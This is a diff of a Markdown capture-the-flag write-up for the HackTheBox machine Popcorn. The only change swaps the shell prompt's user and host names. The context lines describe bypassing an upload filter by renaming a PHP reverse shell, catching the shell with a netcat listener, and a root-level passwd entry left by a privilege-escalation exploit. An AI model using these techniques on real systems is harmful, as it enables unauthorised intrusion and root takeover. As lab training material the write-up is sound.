@@ -51,7 +51,7 @@ Content-Type: image/png
 ```
 I changed `filename="cutiecat.php.png"` to `filename="cutiecat.php"` now check. the page `/torrent/upload/` and check if our reveseshell got upload and BOOM it is there. now view our .php to get a reverse shell!!
 ```
-[10.10.14.43]-kali@kali:~/HTB/popcorn$ nc -nlvp 6969
+[10.10.14.43]-bibo318@parrot:~/HTB/popcorn$ nc -nlvp 6969
 listening on [any] 6969 ...
 connect to [10.10.14.43] from (UNKNOWN) [10.10.10.6] 51870
 Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
@@ -90,7 +90,7 @@ firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash
 
 mmap: b7879000
 ^C
-[10.10.14.43]-kali@kali:~/HTB/popcorn$ nc -nlvp 6969
+[10.10.14.43]-bibo318@parrot:~/HTB/popcorn$ nc -nlvp 6969
 listening on [any] 6969 ...
 connect to [10.10.14.43] from (UNKNOWN) [10.10.10.6] 38532
 Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
